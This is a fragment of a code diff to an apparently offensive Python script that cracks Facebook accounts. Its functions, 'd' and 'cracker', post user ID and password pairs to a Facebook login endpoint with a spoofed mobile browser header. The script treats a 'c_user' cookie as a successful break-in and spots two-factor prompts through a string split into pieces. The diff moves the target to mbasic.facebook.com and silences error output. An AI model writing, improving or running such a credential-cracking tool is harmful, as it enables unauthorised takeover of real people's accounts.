@@ -1833,7 +1833,7 @@ def d(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/async/wbloks/fetch/"
+            url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data2, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1871,7 +1871,7 @@ def d(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 
 def cracker(uid, pwx, tl):
